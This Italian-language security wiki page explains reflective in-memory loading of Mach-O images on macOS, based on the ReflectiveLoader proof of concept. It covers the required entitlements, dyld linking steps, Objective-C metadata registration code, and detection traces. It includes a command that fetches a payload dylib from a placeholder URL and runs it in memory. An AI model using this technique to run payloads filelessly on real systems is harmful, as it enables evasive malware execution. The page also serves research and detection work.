# Caricamento reflective di Mach-O su macOS

{{#include ../../../banners/hacktricks-training.md}}

Un reflective loader mappa un'immagine Mach-O a partire da byte già presenti nel proprio processo, quindi la collega ed esegue i suoi inizializzatori senza chiedere al system loader di aprire un file payload. Si tratta di **esecuzione di codice in-process**, non di una primitiva di escalation dei privilegi o di injection in un processo remoto.<sup>[[2]](#references)</sup>

Nelle versioni recenti di macOS, il vecchio percorso `NSCreateObjectFileImageFromMemory`/`NSLinkModule` scrive l'immagine su disco. ReflectiveLoader integra invece codice di caricamento dyld di Apple più datato; Wardle lo ha dimostrato su macOS 15 e 26.<sup>[[2]](#references)[[3]](#references)</sup>

Se il loader usa Hardened Runtime, il suo codice unsigned in memoria richiede un'eccezione per la memoria eseguibile, come `com.apple.security.cs.allow-unsigned-executable-memory` o `com.apple.security.cs.disable-executable-page-protection`; in caso contrario, l'esecuzione viene bloccata dall'applicazione delle regole di code signing. Questo è un vincolo di signing del loader, non una primitiva di escalation. Consulta il [riferimento agli entitlement di macOS](../macos-security-protections/macos-dangerous-entitlements.md#comapplesecuritycsallow-unsigned-executable-memory).<sup>[[2]](#references)</sup>

Per la PoC, fornisci un URL che serva un **bundle, framework o dylib** Mach-O raw. Il suo `main.mm` rifiuta i download vuoti e specifica che i payload che usano `LC_DYLD_CHAINED_FIXUPS` non sono supportati. È accettato anche un percorso locale, ma questa modalità non è un workflow fileless. La modalità URL legge i byte in `NSData` e passa il relativo buffer e la lunghezza a `custom_dlopen_from_memory`.<sup>[[4]](#references)</sup>

```bash
./PoC 'https://example.invalid/payload.dylib'
```

Il loader incorporato chiama `ImageLoaderMachO::instantiateFromMemory`, quindi `image->link`. Registra i metadati Objective-C **dopo il linking ma prima di** `image->runInitializers`, che esegue i costruttori.<sup>[[5]](#references)</sup> Senza la registrazione, un costruttore che invia un messaggio Objective-C può generare l'errore `unrecognized selector sent to instance`.<sup>[[3]](#references)</sup> Vedi il [normale flusso di caricamento delle immagini di dyld](macos-library-injection/macos-dyld-process.md#flow) e il [riferimento alle sezioni Mach-O](../macos-files-folders-and-binaries/universal-binaries-and-mach-o-format.md#objective-c-common-sections).

## Attivazione dei metadati Objective-C

A differenza del normale caricamento di dyld, incorporare il vecchio image loader non rende automaticamente utilizzabili da `libobjc` i metadati Objective-C del payload.<sup>[[3]](#references)</sup> L'approccio JIT di LLVM adattato analizza le sezioni Objective-C `__DATA` e `__DATA_CONST` mappate, quindi esegue questi passaggi prima dell'esecuzione dei costruttori:<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>

1. Scorrere `__objc_selrefs` a incrementi di `sizeof(SEL)`. Ottenere il nome di ogni selector non nullo con `sel_getName`, passarlo a `sel_registerName` e sostituire il puntatore nella sezione con il `SEL` canonico.
2. Raccogliere le classi da `__objc_classlist` e registrarle con `objc_readClassPair`, risolvendo prima le dipendenze dalle superclassi.
3. Riscrivere i riferimenti in `__objc_classrefs` e `__objc_superrefs` in modo che puntino alle classi o metaclassi registrate, e associare i metodi delle categorie da `__objc_catlist`.

Ad esempio, la correzione dei selector in `ObjCRuntime.cpp` equivale a:<sup>[[6]](#references)</sup>

```objectivec
for (uint8_t *cursor = sectionStart;
     cursor < sectionStart + selRefsSectionSize;
     cursor += sizeof(SEL)) {
    SEL *selector = (SEL *)cursor;
    if (*selector == NULL) continue;
    *selector = sel_registerName(sel_getName(*selector));
}
```

Il PoC si basa sul comportamento interno del runtime Objective-C e non supporta tutte le funzionalità del formato Mach-O, quindi il suo codice di registrazione è un riferimento implementativo, non un loader generico pronto all'uso.<sup>[[1]](#references)[[4]](#references)[[6]](#references)</sup> La registrazione è necessaria sia per le classi e i metodi Apple a cui si fa riferimento, sia per le classi definite dal payload.<sup>[[3]](#references)</sup>

Nei test dell'autore, un'immagine caricata in modo riflessivo non compare in `dyld_all_image_infos`. Le sue mapping eseguibili anonime possono invece comparire in `vmmap` come regioni `dylib` senza nome; i frame campionati possono essere mostrati come `<unknown binary>`. Si tratta di indizi utili per l'ispezione, non di un'attribuzione affidabile a questo loader; inoltre, l'accesso alle informazioni sui task di un altro processo è limitato dagli entitlement. Consulta [macOS memory dumping](../macos-files-folders-and-binaries/macos-memory-dumping.md) per i vincoli relativi all'accesso ai processi.<sup>[[3]](#references)</sup>

## References

- [1] [LLVM JIT, Objective-C e Swift su macOS: raccolta di informazioni](https://stanislaw.github.io/2018-09-03-llvm-jit-objc-and-swift-knowledge-dump.html)
- [2] [Ripristinare il caricamento riflessivo del codice su macOS (Parte I)](https://objective-see.org/blog/blog_0x7C.html)
- [3] [Ripristinare il caricamento riflessivo del codice su macOS (Parte II)](https://objective-see.org/blog/blog_0x82.html)
- [4] [ReflectiveLoader PoC main.mm](https://github.com/pwardle/ReflectiveLoader/blob/main/PoC/PoC/main.mm)
- [5] [ReflectiveLoader custom_dlfcn.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/custom_dlfcn.cpp)
- [6] [ReflectiveLoader ObjCRuntime.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/ObjCRuntime.cpp)
